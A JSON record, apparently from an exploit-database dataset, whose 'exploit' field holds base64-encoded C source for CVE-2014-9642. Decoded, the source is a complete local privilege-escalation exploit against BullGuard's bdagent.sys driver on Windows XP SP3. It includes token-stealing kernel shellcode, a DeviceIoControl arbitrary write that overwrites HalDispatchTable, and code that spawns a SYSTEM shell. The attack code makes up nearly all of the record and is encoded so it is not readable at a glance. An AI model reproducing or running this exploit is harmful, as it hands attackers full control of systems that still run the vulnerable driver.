{
    "source": "exploit-database", 
    "exploit": "77u/LyoNCg0KRXhwbG9pdCBUaXRsZSAgICAtIEJ1bGxHdWFyZCBNdWx0aXBsZSBQcm9kdWN0cyBBcmJpdHJhcnkgV3JpdGUgUHJpdmlsZWdlIEVzY2FsYXRpb24NCkRhdGUgICAgICAgICAgICAgLSAwNHRoIEZlYnJ1YXJ5IDIwMTUNCkRpc2NvdmVyZWQgYnkgICAgLSBQYXJ2ZXogQW53YXIgKEBwYXJ2ZXpnaGgpDQpWZW5kb3IgSG9tZXBhZ2UgIC0gaHR0cDovL3d3dy5idWxsZ3VhcmQuY29tLw0KVGVzdGVkIFZlcnNpb24gICAtIDE0LjEuMjg1LjQNCkRyaXZlciBWZXJzaW9uICAgLSAxLjAuMC42IC0gQmRBZ2VudC5zeXMNClRlc3RlZCBvbiBPUyAgICAgLSAzMmJpdCBXaW5kb3dzIFhQIFNQMyANCk9TVkRCICAgICAgICAgICAgLSBodHRwOi8vd3d3Lm9zdmRiLm9yZy9zaG93L29zdmRiLzExNDQ3OA0KQ1ZFIElEICAgICAgICAgICAtIENWRS0yMDE0LTk2NDINClZlbmRvciBmaXggdXJsICAgLSBodHRwOi8vd3d3LmJ1bGxndWFyZC5jb20vYWJvdXQvcmVsZWFzZS1ub3Rlcy5hc3B4DQpGaXhlZCBWZXJzaW9uICAgIC0gMTUuMC4yODguMQ0KRml4ZWQgZHJpdmVyIHZlciAtIDEuMC4wLjcNCg0KDQoNCk5vdGUNCi0tLS0NCk92ZXJ3cml0dGVuIEhBTCBkaXNwYXRjaCB0YWJsZSBhZnRlciBleHBsb2l0IA0KDQprZD4gZHBzIG50IUhhbERpc3BhdGNoVGFibGUgbCBjDQo4MDU0Y2NiOCAgMDAwMDAwMDMNCjgwNTRjY2JjICAwMDM0MDAwMA0KODA1NGNjYzAgIDAwMDEwMDAwDQo4MDU0Y2NjNCAgMGEwNjAwMDINCjgwNTRjY2M4ICBlZTY1NzY0NQ0KODA1NGNjY2MgIDAwMDAwMDAxDQo4MDU0Y2NkMCAgMDAwMDAwMDENCjgwNTRjY2Q0ICA4NjdjMWJmMA0KODA1NGNjZDggIDgwNjEzZjdiIG50IUlvU2V0UGFydGl0aW9uSW5mb3JtYXRpb24NCjgwNTRjY2RjICA4MDYxNDFlZiBudCFJb1dyaXRlUGFydGl0aW9uVGFibGUNCjgwNTRjY2UwICA4MDUyZDE1NyBudCFDY0hhc0luYWN0aXZlVmlld3MNCjgwNTRjY2U0ICA4MDRlNDJkMSBudCFPYnBUcmFjZURlcHRoKzB4MTkNCg0KNyBwb2ludGVycyBnZXQgb3ZlcndyaXR0ZW4uIFNpbmNlIGlucHV0IGJ1ZmZlciBpcyBpbiBvdXIgY29udHJvbCBhbmQgcG9pbnRlcnMNCmFyZSBzdGF0aWMgaW4gWFAgSSd2ZSB0cmlnZ2VyZWQgdGhlIG92ZXJ3cml0ZSBhZ2FpbiByZXN0b3JpbmcgdGhlIHBvaW50ZXJzLg0KDQoqLw0KDQoNCiNpbmNsdWRlIDxzdGRpby5oPg0KI2luY2x1ZGUgPHdpbmRvd3MuaD4NCg0KI2RlZmluZSBCVUZTSVpFIDQwOTYNCg0KDQp0eXBlZGVmIHN0cnVjdCBfU1lTVEVNX01PRFVMRV9JTkZPUk1BVElPTl9FTlRSWSB7DQogICAgIFBWT0lEICAgVW5rbm93bjE7DQogICAgIFBWT0lEICAgVW5rbm93bjI7DQogICAgIFBWT0lEICAgQmFzZTsNCiAgICAgVUxPTkcgICBTaXplOw0KICAgICBVTE9ORyAgIEZsYWdzOw0KICAgICBVU0hPUlQgIEluZGV4Ow0KICAgICBVU0hPUlQgIE5hbWVMZW5ndGg7DQogICAgIFVTSE9SVCAgTG9hZENvdW50Ow0KICAgICBVU0hPUlQgIFBhdGhMZW5ndGg7DQogICAgIENIQVIgICAgSW1hZ2VOYW1lWzI1Nl07DQp9IFNZU1RFTV9NT0RVTEVfSU5GT1JNQVRJT05fRU5UUlksICpQU1lTVEVNX01PRFVMRV9JTkZPUk1BVElPTl9FTlRSWTsNCiANCnR5cGVkZWYgc3RydWN0IF9TWVNURU1fTU9EVUxFX0lORk9STUFUSU9OIHsNCiAgICAgVUxPTkcgICBDb3VudDsNCiAgICAgU1lTVEVNX01PRFVMRV9JTkZPUk1BVElPTl9FTlRSWSBNb2R1bGVbMV07DQp9IFNZU1RFTV9NT0RVTEVfSU5GT1JNQVRJT04sICpQU1lTVEVNX01PRFVMRV9JTkZPUk1BVElPTjsNCg0KdHlwZWRlZiBlbnVtIF9TWVNURU1fSU5GT1JNQVRJT05fQ0xBU1MgeyANCiAgICAgU3lzdGVtTW9kdWxlSW5mb3JtYXRpb24gPSAxMSwNCiAgICAgU3lzdGVtSGFuZGxlSW5mb3JtYXRpb24gPSAxNg0KfSBTWVNURU1fSU5GT1JNQVRJT05fQ0xBU1M7DQoNCnR5cGVkZWYgTlRTVEFUVVMgKFdJTkFQSSAqX050UXVlcnlTeXN0ZW1JbmZvcm1hdGlvbikoDQogICAgIFNZU1RFTV9JTkZPUk1BVElPTl9DTEFTUyBTeXN0ZW1JbmZvcm1hdGlvbkNsYXNzLA0KICAgICBQVk9JRCBTeXN0ZW1JbmZvcm1hdGlvbiwNCiAgICAgVUxPTkcgU3lzdGVtSW5mb3JtYXRpb25MZW5ndGgsDQogICAgIFBVTE9ORyBSZXR1cm5MZW5ndGgpOw0KDQp0eXBlZGVmIE5UU1RBVFVTIChXSU5BUEkgKl9OdFF1ZXJ5SW50ZXJ2YWxQcm9maWxlKSgNCiAgICAgRFdPUkQgUHJvZmlsZVNvdXJjZSwgDQogICAgIFBVTE9ORyBJbnRlcnZhbCk7DQoNCnR5cGVkZWYgdm9pZCAoKkZVTkNUUFRSKSgpOyANCg0KDQoNCi8vIFdpbmRvd3MgWFAgU1AzDQoNCiNkZWZpbmUgWFBfS1BST0NFU1MgMHg0NCAgICAgIC8vIE9mZnNldCB0byBfS1BST0NFU1MgZnJvbSBhIF9FVEhSRUFEIHN0cnVjdA0KI2RlZmluZSBYUF9UT0tFTiAgICAweGM4ICAgICAgLy8gT2Zmc2V0IHRvIFRPS0VOIGZyb20gdGhlIF9FUFJPQ0VTUyBzdHJ1Y3QNCiNkZWZpbmUgWFBfVVBJRCAgICAgMHg4NCAgICAgIC8vIE9mZnNldCB0byBVbmlxdWVQcm9jZXNzSWQgRlJPTSB0aGUgX0VQUk9DRVNTIHN0cnVjdA0KI2RlZmluZSBYUF9BUExJTktTICAweDg4ICAgICAgLy8gT2Zmc2V0IHRvIEFjdGl2ZVByb2Nlc3NMaW5rcyBfRVBST0NFU1Mgc3RydWN0DQoNCg0KQllURSB0b2tlbl9zdGVhbF94cFtdID0NCnsNCiAgMHg1MiwgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIC8vIHB1c2ggZWR4ICAgICAgICAgICAgICAgICAgICAgICBTYXZlIGVkeCBvbiB0aGUgc3RhY2sNCiAgMHg1MywJICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIC8vIHB1c2ggZWJ4ICAgICAgICAgICAgICAgICAgICAgICBTYXZlIGVieCBvbiB0aGUgc3RhY2sNCiAgMHgzMywweGMwLCAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIC8vIHhvciBlYXgsIGVheCAgICAgICAgICAgICAgICAgICBlYXggPSAwDQogIDB4NjQsMHg4YiwweDgwLDB4MjQsMHgwMSwweDAwLDB4MDAsICAgICAgICAgICAgICAgICAgICAvLyBtb3YgZWF4LCBmczpbZWF4KzEyNGhdICAgICAgICAgUmV0cmlldmUgRVRIUkVBRA0KICAweDhiLDB4NDAsWFBfS1BST0NFU1MsICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgLy8gbW92IGVheCwgW2VheCtYUF9LUFJPQ0VTU10gICAgIFJldHJpZXZlIF9LUFJPQ0VTUw0KICAweDhiLDB4YzgsICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgLy8gbW92IGVjeCwgZWF4DQogIDB4OGIsMHg5OCxYUF9UT0tFTiwweDAwLDB4MDAsMHgwMCwgICAgICAgICAgICAgICAgICAgICAvLyBtb3YgZWJ4LCBbZWF4K1hQX1RPS0VOXSAgICAgICAgUmV0cmlldmVzIFRPS0VODQogIDB4OGIsMHg4MCxYUF9BUExJTktTLDB4MDAsMHgwMCwweDAwLCAgICAgICAgICAgICAgICAgICAvLyBtb3YgZWF4LCBbZWF4K1hQX0FQTElOS1NdIDwtfCAgUmV0cmlldmUgRkxJTksgZnJvbSBBY3RpdmVQcm9jZXNzTGlua3MNCiAgMHg4MSwweGU4LFhQX0FQTElOS1MsMHgwMCwweDAwLDB4MDAsICAgICAgICAgICAgICAgICAgIC8vIHN1YiBlYXgsIFhQX0FQTElOS1MgICAgICAgICB8ICBSZXRyaWV2ZSBfRVBST0NFU1MgUG9pbnRlciBmcm9tIHRoZSBBY3RpdmVQcm9jZXNzTGlua3MNCiAgMHg4MSwweGI4LFhQX1VQSUQsMHgwMCwweDAwLDB4MDAsMHgwNCwweDAwLDB4MDAsMHgwMCwgIC8vIGNtcCBbZWF4K1hQX1VQSURdLCA0ICAgICAgICB8ICBDb21wYXJlcyBVbmlxdWVQcm9jZXNzSWQgd2l0aCA0IChTeXN0ZW0gUHJvY2VzcykNCiAgMHg3NSwweGU4LCAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIC8vIGpuZSAgICAgICAgICAgICAgICAgICAgIC0tLS0gDQogIDB4OGIsMHg5MCxYUF9UT0tFTiwweDAwLDB4MDAsMHgwMCwgICAgICAgICAgICAgICAgICAgICAvLyBtb3YgZWR4LCBbZWF4K1hQX1RPS0VOXSAgICAgICAgUmV0cmlldmVzIFRPS0VOIGFuZCBzdG9yZXMgb24gRURYDQogIDB4OGIsMHhjMSwgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAvLyBtb3YgZWF4LCBlY3ggICAgICAgICAgICAgICAgICAgUmV0cmlldmVzIEtQUk9DRVNTIHN0b3JlZCBvbiBFQ1gNCiAgMHg4OSwweDkwLFhQX1RPS0VOLDB4MDAsMHgwMCwweDAwLCAgICAgICAgICAgICAgICAgICAgIC8vIG1vdiBbZWF4K1hQX1RPS0VOXSwgZWR4ICAgICAgICBPdmVyd3JpdGVzIHRoZSBUT0tFTiBmb3IgdGhlIGN1cnJlbnQgS1BST0NFU1MNCiAgMHg1YiwgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIC8vIHBvcCBlYnggICAgICAgICAgICAgICAgICAgICAgICBSZXN0b3JlcyBlYngNCiAgMHg1YSwgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIC8vIHBvcCBlZHggICAgICAgICAgICAgICAgICAgICAgICBSZXN0b3JlcyBlZHgNCiAgMHhjMiwweDA4ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIC8vIHJldCA4ICAgICAgICAgICAgICAgICAgICAgICAgICBBd2F5IGZyb20gdGhlIGtlcm5lbCAgIA0KfTsNCg0KDQoNCkJZVEUgcmVzdG9yZV9wb2ludGVyc194cFtdID0gIC8vIGtkPiBkcHMgbnQhSGFsRGlzcGF0Y2hUYWJsZQ0KIlx4ZjJceGEzXHg2Zlx4ODAiICAgICAgICAgICAgLy8gODA1NGNjYmMgIDgwNmZhM2YyIGhhbCFIYWxpUXVlcnlTeXN0ZW1JbmZvcm1hdGlvbg0KIlx4Y2VceGEzXHg2Zlx4ODAiICAgICAgICAgICAgLy8gODA1NGNjYzAgIDgwNmZhM2NlIGhhbCFIYWxpU2V0U3lzdGVtSW5mb3JtYXRpb24NCiJceDBiXHg0Nlx4NjFceDgwIiAgICAgICAgICAgIC8vIDgwNTRjY2M0ICA4MDYxNDYwYiBudCF4SGFsUXVlcnlCdXNTbG90cw0KIlx4MDBceDAwXHgwMFx4MDAiICAgICAgICAgICAgLy8gODA1NGNjYzggIDAwMDAwMDAwDQoiXHg0ZFx4YWNceDUwXHg4MCIgICAgICAgICAgICAvLyA4MDU0Y2NjYyAgODA1MGFjNGQgbnQhSGFsRXhhbWluZU1CUg0KIlx4ODlceDZmXHg1Y1x4ODAiICAgICAgICAgICAgLy8gODA1NGNjZDAgIDgwNWM2Zjg5IG50IUlvQXNzaWduRHJpdmVMZXR0ZXJzDQoiXHhlNVx4NGFceDVjXHg4MCI7ICAgICAgICAgICAvLyA4MDU0Y2NkNCAgODA1YzRhZTUgbnQhSW9SZWFkUGFydGl0aW9uVGFibGUNCg0KDQoNCkRXT1JEIEhhbERpc3BhdGNoVGFibGVBZGRyZXNzKCkgDQp7DQogICAgX050UXVlcnlTeXN0ZW1JbmZvcm1hdGlvbiAgICBOdFF1ZXJ5U3lzdGVtSW5mb3JtYXRpb247DQogICAgUFNZU1RFTV9NT0RVTEVfSU5GT1JNQVRJT04gICBwTW9kdWxlSW5mbzsNCiAgICBEV09SRCAgICAgICAgICAgICAgICAgICAgICAgIEhhbERpc3BhdGNoVGFibGU7DQogICAgQ0hBUiAgICAgICAgICAgICAgICAgICAgICAgICBrRnVsbE5hbWVbMjU2XTsNCiAgICBQVk9JRCAgICAgICAgICAgICAgICAgICAgICAgIGtCYXNlID0gTlVMTDsNCiAgICBMUFNUUiAgICAgICAgICAgICAgICAgICAgICAgIGtOYW1lOw0KICAgIEhNT0RVTEUgICAgICAgICAgICAgICAgICAgICAgS2VybmVsOw0KICAgIEZVTkNUUFRSICAgICAgICAgICAgICAgICAgICAgSGFsOw0KICAgIFVMT05HICAgICAgICAgICAgICAgICAgICAgICAgbGVuOw0KICAgIE5UU1RBVFVTICAgICAgICAgICAgICAgICAgICAgc3RhdHVzOw0KDQoNCiAgICBOdFF1ZXJ5U3lzdGVtSW5mb3JtYXRpb24gPSAoX050UXVlcnlTeXN0ZW1JbmZvcm1hdGlvbilHZXRQcm9jQWRkcmVzcyhHZXRNb2R1bGVIYW5kbGUoIm50ZGxsLmRsbCIpLCAiTnRRdWVyeVN5c3RlbUluZm9ybWF0aW9uIik7DQogCQ0KICAgIGlmICghTnRRdWVyeVN5c3RlbUluZm9ybWF0aW9uKQ0KICAgIHsNCiAgICAgICAgcHJpbnRmKCJbLV0gVW5hYmxlIHRvIHJlc29sdmUgTnRRdWVyeVN5c3RlbUluZm9ybWF0aW9uXG5cbiIpOw0KICAgICAgICByZXR1cm4gLTE7ICANCiAgICB9DQoNCiAgICBzdGF0dXMgPSBOdFF1ZXJ5U3lzdGVtSW5mb3JtYXRpb24oU3lzdGVtTW9kdWxlSW5mb3JtYXRpb24sIE5VTEwsIDAsICZsZW4pOw0KDQogICAgaWYgKCFzdGF0dXMpIA0KICAgIHsNCiAgICAgICAgcHJpbnRmKCJbLV0gQW4gZXJyb3Igb2NjdXJlZCB3aGlsZSByZWFkaW5nIE50UXVlcnlTeXN0ZW1JbmZvcm1hdGlvbi4gU3RhdHVzID0gMHglMDh4XG5cbiIsIHN0YXR1cyk7DQogICAgICAgIHJldHVybiAtMTsNCiAgICB9DQoJCQ0KICAgIHBNb2R1bGVJbmZvID0gKFBTWVNURU1fTU9EVUxFX0lORk9STUFUSU9OKUdsb2JhbEFsbG9jKEdNRU1fWkVST0lOSVQsIGxlbik7DQoNCiAgICBpZihwTW9kdWxlSW5mbyA9PSBOVUxMKQ0KICAgIHsNCiAgICAgICAgcHJpbnRmKCJbLV0gQW4gZXJyb3Igb2NjdXJyZWQgd2l0aCBHbG9iYWxBbGxvYyBmb3IgcE1vZHVsZUluZm9cblxuIik7DQogICAgICAgIHJldHVybiAtMTsNCiAgICB9DQoNCiAgICBzdGF0dXMgPSBOdFF1ZXJ5U3lzdGVtSW5mb3JtYXRpb24oU3lzdGVtTW9kdWxlSW5mb3JtYXRpb24sIHBNb2R1bGVJbmZvLCBsZW4sICZsZW4pOw0KCQ0KICAgIG1lbXNldChrRnVsbE5hbWUsIDB4MDAsIHNpemVvZihrRnVsbE5hbWUpKTsNCiAgICBzdHJjcHlfcyhrRnVsbE5hbWUsIHNpemVvZihrRnVsbE5hbWUpLTEsIHBNb2R1bGVJbmZvLT5Nb2R1bGVbMF0uSW1hZ2VOYW1lKTsNCiAgICBrQmFzZSA9IHBNb2R1bGVJbmZvLT5Nb2R1bGVbMF0uQmFzZTsNCg0KICAgIHByaW50ZigiW2ldIEtlcm5lbCBiYXNlIG5hbWUgJXNcbiIsIGtGdWxsTmFtZSk7DQogICAga05hbWUgPSBzdHJyY2hyKGtGdWxsTmFtZSwgJ1xcJyk7DQoNCiAgICBLZXJuZWwgPSBMb2FkTGlicmFyeUEoKytrTmFtZSk7DQoNCiAgICBpZihLZXJuZWwgPT0gTlVMTCkgDQogICAgew0KICAgICAgICBwcmludGYoIlstXSBGYWlsZWQgdG8gbG9hZCBrZXJuZWwgYmFzZVxuXG4iKTsNCiAgICAgICAgcmV0dXJuIC0xOw0KICAgIH0NCg0KICAgIEhhbCA9IChGVU5DVFBUUilHZXRQcm9jQWRkcmVzcyhLZXJuZWwsICJIYWxEaXNwYXRjaFRhYmxlIik7DQoNCiAgICBpZihIYWwgPT0gTlVMTCkNCiAgICB7DQogICAgICAgIHByaW50ZigiWy1dIEZhaWxlZCB0byBmaW5kIEhhbERpc3BhdGNoVGFibGVcblxuIik7DQogICAgICAgIHJldHVybiAtMTsNCiAgICB9DQogICAgDQogICAgcHJpbnRmKCJbaV0gSGFsRGlzcGF0Y2hUYWJsZSBhZGRyZXNzIDB4JTA4eFxuIiwgSGFsKTsJDQogICAgcHJpbnRmKCJbaV0gS2VybmVsIGhhbmRsZSAweCUwOHhcbiIsIEtlcm5lbCk7DQogICAgcHJpbnRmKCJbaV0gS2VybmVsIGJhc2UgYWRkcmVzcyAweCUwOHhcbiIsIGtCYXNlKTsgICAgICAgICAgDQoNCiAgICBIYWxEaXNwYXRjaFRhYmxlID0gKChEV09SRClIYWwgLSAoRFdPUkQpS2VybmVsICsgKERXT1JEKWtCYXNlKTsNCg0KICAgIHByaW50ZigiWytdIEtlcm5lbCBhZGRyZXNzIG9mIEhhbERpc3BhdGNoVGFibGUgMHglMDh4XG4iLCBIYWxEaXNwYXRjaFRhYmxlKTsNCg0KICAgIGlmKCFIYWxEaXNwYXRjaFRhYmxlKQ0KICAgIHsNCiAgICAgICAgcHJpbnRmKCJbLV0gRmFpbGVkIHRvIGNhbGN1bGF0ZSBIYWxEaXNwYXRjaFRhYmxlXG5cbiIpOw0KCXJldHVybiAtMTsNCiAgICB9DQoNCiAgICByZXR1cm4gSGFsRGlzcGF0Y2hUYWJsZTsNCn0NCg0KDQppbnQgR2V0V2luZG93c1ZlcnNpb24oKQ0Kew0KICAgIGludCB2ID0gMDsNCiAgICBEV09SRCB2ZXJzaW9uID0gMCwgbWluVmVyc2lvbiA9IDAsIG1halZlcnNpb24gPSAwOw0KDQogICAgdmVyc2lvbiA9IEdldFZlcnNpb24oKTsNCg0KICAgIG1pblZlcnNpb24gPSAoRFdPUkQpKEhJQllURShMT1dPUkQodmVyc2lvbikpKTsNCiAgICBtYWpWZXJzaW9uID0gKERXT1JEKShMT0JZVEUoTE9XT1JEKHZlcnNpb24pKSk7DQoNCiAgICBpZiAobWluVmVyc2lvbiA9PSAxICYmIG1halZlcnNpb24gPT0gNSkgdiA9IDE7ICAvLyAiV2luZG93cyBYUDsNCiAgICBpZiAobWluVmVyc2lvbiA9PSAxICYmIG1halZlcnNpb24gPT0gNikgdiA9IDI7ICAvLyAiV2luZG93cyA3IjsNCiAgICBpZiAobWluVmVyc2lvbiA9PSAyICYmIG1halZlcnNpb24gPT0gNSkgdiA9IDM7ICAvLyAiV2luZG93cyBTZXJ2ZXIgMjAwMzsNCg0KICAgIHJldHVybiB2Ow0KfQ0KDQoNCnZvaWQgc3Bhd25TaGVsbCgpDQp7DQogICAgU1RBUlRVUElORk9BIHNpOw0KICAgIFBST0NFU1NfSU5GT1JNQVRJT04gcGk7DQoNCg0KICAgIFplcm9NZW1vcnkoJnBpLCBzaXplb2YocGkpKTsNCiAgICBaZXJvTWVtb3J5KCZzaSwgc2l6ZW9mKHNpKSk7DQogICAgc2kuY2IgPSBzaXplb2Yoc2kpOw0KDQogICAgc2kuY2IgICAgICAgICAgPSBzaXplb2Yoc2kpOyANCiAgICBzaS5kd0ZsYWdzICAgICA9IFNUQVJURl9VU0VTSE9XV0lORE9XOw0KICAgIHNpLndTaG93V2luZG93ID0gU1dfU0hPV05PUk1BTDsNCg0KICAgIGlmICghQ3JlYXRlUHJvY2VzcyhOVUxMLCAiY21kLmV4ZSIsIE5VTEwsIE5VTEwsIFRSVUUsIENSRUFURV9ORVdfQ09OU09MRSwgTlVMTCwgTlVMTCwgJnNpLCAmcGkpKQ0KICAgIHsNCiAgICAgICAgcHJpbnRmKCJcblstXSBDcmVhdGVQcm9jZXNzIGZhaWxlZCAoJWQpXG5cbiIsIEdldExhc3RFcnJvcigpKTsNCiAgICAgICAgcmV0dXJuOw0KICAgIH0NCg0KICAgIENsb3NlSGFuZGxlKHBpLmhUaHJlYWQpOw0KICAgIENsb3NlSGFuZGxlKHBpLmhQcm9jZXNzKTsNCn0NCg0KDQppbnQgbWFpbihpbnQgYXJnYywgY2hhciAqYXJndltdKSANCnsNCg0KICAgIF9OdFF1ZXJ5SW50ZXJ2YWxQcm9maWxlICAgICBOdFF1ZXJ5SW50ZXJ2YWxQcm9maWxlOw0KICAgIExQVk9JRCAgICAgICAgICAgICAgICAgICAgICBpbnB1dFsxXSA9IHswfTsgICANCiAgICBMUFZPSUQgICAgICAgICAgICAgICAgICAgICAgYWRkcnRvc2hlbGw7DQogICAgSEFORExFICAgICAgICAgICAgICAgICAgICAgIGhEZXZpY2U7DQogICAgRFdPUkQgICAgICAgICAgICAgICAgICAgICAgIGR3UmV0Qnl0ZXMgPSAwOw0KICAgIERXT1JEICAgICAgICAgICAgICAgICAgICAgICBIYWxEaXNwYXRjaFRhYmxlVGFyZ2V0OyAgICAgICAgICAgICAgICANCiAgICBVTE9ORyAgICAgICAgICAgICAgICAgICAgICAgdGltZSA9IDA7DQogICAgdW5zaWduZWQgY2hhciAgICAgICAgICAgICAgIGRldmhhbmRsZVtNQVhfUEFUSF07IA0KDQoNCiAgICBwcmludGYoIi0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS1cbiIpOw0KICAgIHByaW50ZigiICAgICBCdWxsR3VhcmQgTXVsdGlwbGUgUHJvZHVjdHMgKGJkYWdlbnQuc3lzKSBBcmJpdHJhcnkgV3JpdGUgRW9QIEV4cGxvaXQgICAgIFxuIik7DQogICAgcHJpbnRmKCIgICAgICAgICAgICAgICAgICAgICAgICAgVGVzdGVkIG9uIFdpbmRvd3MgWFAgU1AzICgzMmJpdCkgICAgICAgICAgICAgICAgICAgICAgXG4iKTsNCiAgICBwcmludGYoIi0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS1cblxuIik7DQoNCiAgICBpZiAoR2V0V2luZG93c1ZlcnNpb24oKSA9PSAxKSANCiAgICB7DQogICAgICAgIHByaW50ZigiW2ldIFJ1bm5pbmcgV2luZG93cyBYUFxuIik7DQogICAgfQ0KDQogICAgaWYgKEdldFdpbmRvd3NWZXJzaW9uKCkgPT0gMCkgDQogICAgew0KICAgICAgICBwcmludGYoIltpXSBFeHBsb2l0IG5vdCBzdXBwb3J0ZWQgb24gdGhpcyBPU1xuXG4iKTsNCiAgICAgICAgcmV0dXJuIC0xOw0KICAgIH0gIA0KDQogICAgc3ByaW50ZihkZXZoYW5kbGUsICJcXFxcLlxcJXMiLCAiYmRhZ2VudCIpOw0KDQogICAgTnRRdWVyeUludGVydmFsUHJvZmlsZSA9IChfTnRRdWVyeUludGVydmFsUHJvZmlsZSlHZXRQcm9jQWRkcmVzcyhHZXRNb2R1bGVIYW5kbGUoIm50ZGxsLmRsbCIpLCAiTnRRdWVyeUludGVydmFsUHJvZmlsZSIpOw0KIAkNCiAgICBpZiAoIU50UXVlcnlJbnRlcnZhbFByb2ZpbGUpDQogICAgew0KICAgICAgICBwcmludGYoIlstXSBVbmFibGUgdG8gcmVzb2x2ZSBOdFF1ZXJ5SW50ZXJ2YWxQcm9maWxlXG5cbiIpOw0KICAgICAgICByZXR1cm4gLTE7ICANCiAgICB9DQogICANCiAgICBhZGRydG9zaGVsbCA9IFZpcnR1YWxBbGxvYyhOVUxMLCBCVUZTSVpFLCBNRU1fQ09NTUlUIHwgTUVNX1JFU0VSVkUsIFBBR0VfRVhFQ1VURV9SRUFEV1JJVEUpOw0KDQogICAgaWYoYWRkcnRvc2hlbGwgPT0gTlVMTCkNCiAgICB7DQogICAgICAgIHByaW50ZigiWy1dIFZpcnR1YWxBbGxvYyBhbGxvY2F0aW9uIGZhaWx1cmUgJS44eFxuXG4iLCBHZXRMYXN0RXJyb3IoKSk7DQogICAgICAgIHJldHVybiAtMTsNCiAgICB9DQogICAgcHJpbnRmKCJbK10gVmlydHVhbEFsbG9jIGFsbG9jYXRlZCBtZW1vcnkgYXQgMHglLjh4XG4iLCBhZGRydG9zaGVsbCk7DQoNCiAgICBtZW1zZXQoYWRkcnRvc2hlbGwsIDB4OTAsIEJVRlNJWkUpOw0KICAgIG1lbWNweShhZGRydG9zaGVsbCwgdG9rZW5fc3RlYWxfeHAsIHNpemVvZih0b2tlbl9zdGVhbF94cCkpOw0KICAgIHByaW50ZigiW2ldIFNpemUgb2Ygc2hlbGxjb2RlICVkIGJ5dGVzXG4iLCBzaXplb2YodG9rZW5fc3RlYWxfeHApKTsNCg0KICAgIGhEZXZpY2UgPSBDcmVhdGVGaWxlKGRldmhhbmRsZSwgR0VORVJJQ19SRUFELCBGSUxFX1NIQVJFX1JFQUQgfCBGSUxFX1NIQVJFX1dSSVRFLCBOVUxMLCBPUEVOX0VYSVNUSU5HICwgMCwgTlVMTCk7DQogICAgDQogICAgaWYgKGhEZXZpY2UgPT0gSU5WQUxJRF9IQU5ETEVfVkFMVUUpDQogICAgew0KICAgICAgICBwcmludGYoIlstXSBDcmVhdGVGaWxlIG9wZW4gJXMgZGV2aWNlIGZhaWxlZCAoJWQpXG5cbiIsIGRldmhhbmRsZSwgR2V0TGFzdEVycm9yKCkpOw0KICAgICAgICByZXR1cm4gLTE7DQogICAgfQ0KICAgIGVsc2UgDQogICAgew0KICAgICAgICBwcmludGYoIlsrXSBPcGVuICVzIGRldmljZSBzdWNjZXNzZnVsXG4iLCBkZXZoYW5kbGUpOw0KICAgIH0NCg0KICAgIEhhbERpc3BhdGNoVGFibGVUYXJnZXQgPSBIYWxEaXNwYXRjaFRhYmxlQWRkcmVzcygpICsgc2l6ZW9mKERXT1JEKTsNCiAgICBwcmludGYoIlsrXSBIYWxEaXNwYXRjaFRhYmxlKzQgKDB4JTA4eCkgd2lsbCBiZSBvdmVyd3JpdHRlblxuIiwgSGFsRGlzcGF0Y2hUYWJsZVRhcmdldCk7DQoNCiAgICBpbnB1dFswXSA9IGFkZHJ0b3NoZWxsOyAgLy8gaW5wdXQgYnVmZmVyIGNvbnRlbnRzIGdldHMgd3JpdHRlbiB0byBvdXIgb3V0cHV0IGJ1ZmZlciBhZGRyZXNzDQogICAgICAgICAgICAgICAgICAgIA0KICAgIHByaW50ZigiWytdIElucHV0IGJ1ZmZlciBjb250ZW50cyAlMDh4XG4iLCBpbnB1dFswXSk7DQogCQ0KICAgIHByaW50ZigiW35dIFByZXNzIGFueSBrZXkgdG8gc2VuZCBFeHBsb2l0ICAuIC4gLlxuIik7DQogICAgZ2V0Y2goKTsNCg0KICAgIERldmljZUlvQ29udHJvbChoRGV2aWNlLCAweDAwMjI0MDVjLCBpbnB1dCwgc2l6ZW9mKGlucHV0KSwgKExQVk9JRClIYWxEaXNwYXRjaFRhYmxlVGFyZ2V0LCAwLCAmZHdSZXRCeXRlcywgTlVMTCk7DQoNCiAgICBwcmludGYoIlsrXSBCdWZmZXIgc2VudFxuIik7DQoNCiAgICBwcmludGYoIlsrXSBTcGF3bmluZyBTWVNURU0gU2hlbGxcbiIpOw0KICAgIE50UXVlcnlJbnRlcnZhbFByb2ZpbGUoMiwgJnRpbWUpOw0KICAgIHNwYXduU2hlbGwoKTsNCg0KICAgIHByaW50ZigiWytdIFJlc3RvcmluZyBIYWwgZGlzcGF0Y2ggdGFibGUgcG9pbnRlcnNcblxuIik7DQoNCiAgICBEZXZpY2VJb0NvbnRyb2woaERldmljZSwgMHgwMDIyNDA1YywgcmVzdG9yZV9wb2ludGVyc194cCwgc2l6ZW9mKHJlc3RvcmVfcG9pbnRlcnNfeHApLTEsIChMUFZPSUQpSGFsRGlzcGF0Y2hUYWJsZVRhcmdldCwgMCwgJmR3UmV0Qnl0ZXMsIE5VTEwpOw0KDQogICAgQ2xvc2VIYW5kbGUoaERldmljZSk7DQoNCiAgICByZXR1cm4gMDsNCn0=", 
    "filename": "platforms/windows/local/35994.c", 
    "id": "35994", 
    "cves": [
        "CVE-2014-9642"
    ]
}